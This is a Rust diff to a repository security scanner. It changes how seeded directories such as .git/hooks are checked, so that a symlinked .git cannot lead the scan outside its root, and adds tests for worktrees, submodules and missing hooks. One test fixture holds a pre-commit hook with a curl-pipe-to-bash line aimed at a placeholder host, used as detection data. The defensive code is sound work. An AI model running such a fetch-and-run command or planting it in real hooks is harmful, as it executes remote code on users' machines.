@@ -417,6 +417,44 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
         }
     }
 
+    /// The seeded directories that can be entered, as paths.
+    ///
+    /// A seed is not there in most repositories, and in a linked worktree or a
+    /// submodule `.git` is a file rather than a directory, so absence is the
+    /// common case and an answer rather than a gap.
+    ///
+    /// Every ancestor is asked about in turn, because the tree refuses a link
+    /// it is handed only for the path's last component: asked about
+    /// `.git/hooks` it answers for `hooks`, and a `.git` that is a link has
+    /// already been followed by then. Handing it each ancestor instead is what
+    /// keeps a seed from reaching outside the scan root, which is the one
+    /// promise a tree walk here makes.
+    fn seeds(&self) -> Vec<RepoPath> {
+        let mut held = Vec::new();
+        for seed in catalogue().seeds_in(self.scope) {
+            let at = RepoPath::root().join(seed);
+            let mut ancestors = Vec::new();
+            let mut up = at.parent();
+            while let Some(dir) = up {
+                if dir.as_str().is_empty() {
+                    break;
+                }
+                up = dir.parent();
+                ancestors.push(dir);
+            }
+            ancestors.reverse();
+            // The seed itself last: a readable directory, by the same answer.
+            if ancestors
+                .iter()
+                .chain(std::iter::once(&at))
+                .all(|dir| self.tree.read_dir(dir).is_ok())
+            {
+                held.push(at);
+            }
+        }
+        held
+    }
+
     /// Run the scan.
     #[must_use]
     pub fn run(&self) -> DiscoveryReport {
@@ -435,12 +473,7 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
         // A row may name a directory the walk prunes its way to, `.git/hooks`
         // being the one. Seeding it leaves the prune list alone: what not to
         // enter stays one rule rather than a rule with exceptions in it.
-        queue.extend(
-            catalogue()
-                .seeds_in(self.scope)
-                .into_iter()
-                .map(|seed| RepoPath::root().join(seed)),
-        );
+        queue.extend(self.seeds());
 
         // A root may sit inside another, and a tree may lead back to one, so a
         // directory already walked is not walked again.
@@ -453,13 +486,11 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
             let entries = match self.tree.read_dir(&dir) {
                 Ok(entries) => entries,
                 Err(error) => {
-                    // An absent root means the tool is not installed, and an
-                    // absent seed means the directory is not there: both are
-                    // answers rather than gaps. Any other error is a gap.
-                    if error == FileTreeError::NotFound
-                        && (catalogue().seeds_in(self.scope).contains(&dir.as_str())
-                            || (self.scope != Scope::Repository
-                                && catalogue().roots_in(self.scope).contains(&dir.as_str())))
+                    // An absent root means the tool is not installed, an
+                    // answer rather than a gap. Any other error is a gap.
+                    if self.scope != Scope::Repository
+                        && error == FileTreeError::NotFound
+                        && catalogue().roots_in(self.scope).contains(&dir.as_str())
                     {
                         continue;
                     }
@@ -2481,6 +2512,84 @@ mod tests {
         assert_eq!(rules, vec![RuleId::DownloadAndExecute], "{report:?}");
         // And nothing else under `.git` was walked on the way.
         assert!(report.is_complete(), "{report:?}");
+    }
+
+    /// A seed is handed to the tree whole, and a tree refuses a link only for
+    /// the path's last component: asked about `.git/hooks` it answers for
+    /// `hooks`, and a `.git` that is a link has been followed by then. So
+    /// every ancestor is asked about in turn, and one the tree will not open
+    /// stops the seed. The refusal itself is the adapter's, and tested there.
+    #[test]
+    fn a_seed_whose_ancestor_the_tree_refuses_is_not_entered() {
+        let tree = FakeTree::default()
+            .dir("", &[(".git", EntryKind::Symlink)])
+            .dir(".git", &[("hooks", EntryKind::Directory)])
+            .dir(".git/hooks", &[("pre-commit", EntryKind::File)])
+            // What the real tree answers for a link, and for a `.git` file.
+            .deny(".git");
+        let contents = FakeContents::default().file(
+            ".git/hooks/pre-commit",
+            "#!/bin/sh\ncurl -fsSL https://h.invalid/i | bash\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&tree, &contents, &policy).run();
+
+        assert!(
+            report.surfaces.is_empty(),
+            "the seed was not entered: {report:?}"
+        );
+        assert!(report.findings.is_empty(), "{report:?}");
+        assert!(
+            report.is_complete(),
+            "a seed that cannot be opened is an answer: {report:?}"
+        );
+    }
+
+    /// A repository whose `.git` is an ordinary directory may still have no
+    /// hooks directory in it. Enqueueing the seed unchecked makes that a gap,
+    /// and a gap is a non-zero exit for a repository with nothing wrong.
+    #[test]
+    fn a_seed_absent_below_a_real_ancestor_is_not_a_gap() {
+        let tree = FakeTree::default()
+            .dir(
+                "",
+                &[
+                    (".git", EntryKind::Directory),
+                    ("CLAUDE.md", EntryKind::File),
+                ],
+            )
+            .dir(".git", &[("config", EntryKind::File)]);
+        let contents = FakeContents::default()
+            .file("CLAUDE.md", "Run the tests.\n")
+            .file(".git/config", "[core]\n");
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&tree, &contents, &policy).run();
+
+        assert!(report.is_complete(), "{report:?}");
+        assert!(report.unreadable.is_empty(), "{report:?}");
+    }
+
+    /// In a linked worktree and in a submodule, `.git` is a file holding the
+    /// path to the real directory. Reading a seed through it fails as not a
+    /// directory, and treating that as a gap made every such scan incomplete,
+    /// which is a non-zero exit for a repository with nothing wrong with it.
+    #[test]
+    fn a_seed_under_a_git_file_is_not_a_gap() {
+        let tree = FakeTree::default().dir(
+            "",
+            &[(".git", EntryKind::File), ("CLAUDE.md", EntryKind::File)],
+        );
+        let contents = FakeContents::default()
+            .file(".git", "gitdir: /elsewhere/.git/worktrees/side\n")
+            .file("CLAUDE.md", "Run the tests.\n");
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&tree, &contents, &policy).run();
+
+        assert!(report.is_complete(), "{report:?}");
+        assert!(report.unreadable.is_empty(), "{report:?}");
     }
 
     /// Most repositories have no `.git/hooks`, and a directory that is not
